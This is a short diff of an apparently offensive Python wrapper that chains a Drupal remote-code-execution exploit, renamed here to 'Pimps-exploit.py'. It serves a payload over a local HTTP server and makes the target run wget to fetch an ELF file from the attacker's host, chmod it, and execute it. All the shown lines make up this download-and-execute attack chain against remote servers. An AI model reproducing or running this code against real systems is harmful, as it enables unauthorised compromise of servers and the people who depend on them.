@@ -19,9 +19,9 @@ def linux():
 
        subprocess.Popen(["python3","-m","http.server","8080"])
 
-       os.system("python3 drupal-exploit.py -c 'wget http://%s:8080/%s.elf' http://%s/"%(lhost,payl,rhost))
-       os.system("python3 drupal-exploit.py -c 'chmod 777 %s.elf' http://%s/"%(payl,rhost))
-       os.system("python3 drupal-exploit.py -c './%s.elf' http://%s/"%(payl,rhost))
+       os.system("python3 Pimps-exploit.py -c 'wget http://%s:8080/%s.elf' http://%s/"%(lhost,payl,rhost))
+       os.system("python3 Pimps-exploit.py -c 'chmod 777 %s.elf' http://%s/"%(payl,rhost))
+       os.system("python3 Pimps-exploit.py -c './%s.elf' http://%s/"%(payl,rhost))
   
 print("""notes for usage:
           -the script must be in the same folder as the Pimps exploit""")
